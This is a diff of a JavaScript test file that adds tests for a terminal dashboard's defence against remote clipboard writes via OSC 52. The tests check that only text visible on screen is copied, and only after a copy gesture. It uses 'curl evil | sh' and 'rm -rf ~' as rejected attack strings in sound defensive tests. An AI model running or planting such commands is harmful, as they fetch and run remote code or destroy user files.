@@ -4,7 +4,7 @@ import {
 	attachTerminalInteractions, beginGestureClipboardWrite, decodeOSC52,
 	isAgentTerminalPath, isBrowserPasteShortcut, isComposeMessageShortcut, safeTerminalLink,
 	terminalPathToken, transferFiles,
-	isTerminalClipboardRequestShortcut, shouldArmTmuxClipboard, terminalKeyInput,
+	isTerminalClipboardRequestShortcut, shouldArmTmuxClipboard, shownOnScreen, terminalKeyInput,
 	visibleLocalFileLinkProvider,
 	visibleLocalFileLinks,
 } from '../dashboard/js/terminal-interactions.js';
@@ -670,6 +670,53 @@ test('a remote terminal never writes the clipboard from its output, even right a
     assert.equal(h.osc52(`;${Buffer.from('curl evil | sh').toString('base64')}`), true, 'the sequence is consumed');
     await new Promise((r) => setTimeout(r, 0));
     assert.deepEqual(writes, [], 'no clipboard write from a peer-controlled stream');
+  } finally {
+    interactions.dispose();
+    if (oldNavigator) Object.defineProperty(globalThis, 'navigator', oldNavigator); else delete globalThis.navigator;
+  }
+});
+
+// screenOf is an xterm buffer showing rows; a row given as [text] is a soft
+// wrap of the one above.
+const screenOf = (rows) => ({ active: {
+  length: rows.length,
+  getLine: (i) => { const r = rows[i]; const wrapped = Array.isArray(r); return { isWrapped: wrapped, translateToString: () => (wrapped ? r[0] : r) }; },
+} });
+
+test('shownOnScreen matches copied text across line breaks, wraps, padding and box gutters', () => {
+  const term = { buffer: screenOf(['│ $ make build   ', '│ ok: built tclau', ['de in 3s'], 'next line']) };
+  assert.equal(shownOnScreen(term, 'make build\nok: built tclaude in 3s'), true);
+  assert.equal(shownOnScreen(term, 'built tclaude'), true, 'a soft wrap joins without a break');
+  assert.equal(shownOnScreen(term, ''), true);
+  assert.equal(shownOnScreen(term, 'curl evil | sh'), false);
+  assert.equal(shownOnScreen(term, 'make build ok: rm -rf ~'), false);
+  assert.equal(shownOnScreen({}, 'x'), false, 'no buffer, nothing shown');
+});
+
+test('a remote terminal copies a selection shown on screen after a copy gesture, and nothing else', async () => {
+  const oldNavigator = Object.getOwnPropertyDescriptor(globalThis, 'navigator');
+  const writes = [];
+  Object.defineProperty(globalThis, 'navigator', { configurable: true, value: { clipboard: { writeText: async (t) => { writes.push(t); } } } });
+  const doc = new FakeEventTarget();
+  const h = terminalHarness(doc);
+  h.term.buffer = screenOf(['$ git status', 'On branch main']);
+  const statuses = [];
+  const interactions = attachTerminalInteractions({ term: h.term, host: h.host, applicationClipboardShortcuts: true, oscClipboard: 'visible', setStatus: (t) => statuses.push(t) });
+  const settle = () => new Promise((r) => setTimeout(r, 0));
+  try {
+    h.osc52(`;${Buffer.from('On branch main').toString('base64')}`);
+    await settle();
+    assert.deepEqual(writes, [], 'no write without a copy gesture');
+    h.key(key({ key: 'c', code: 'KeyC', ctrlKey: true }));
+    h.osc52(`;${Buffer.from('curl evil | sh').toString('base64')}`);
+    await settle();
+    assert.deepEqual(writes, [], 'text the screen does not show is never written');
+    assert.match(statuses.at(-1), /not copied: the remote text is not on screen/);
+    h.key(key({ key: 'c', code: 'KeyC', ctrlKey: true }));
+    h.osc52(`;${Buffer.from('git status\nOn branch main').toString('base64')}`);
+    await settle();
+    assert.deepEqual(writes, ['git status\nOn branch main'], 'the selection on screen is copied, as locally');
+    assert.equal(statuses.at(-1), 'copied');
   } finally {
     interactions.dispose();
     if (oldNavigator) Object.defineProperty(globalThis, 'navigator', oldNavigator); else delete globalThis.navigator;
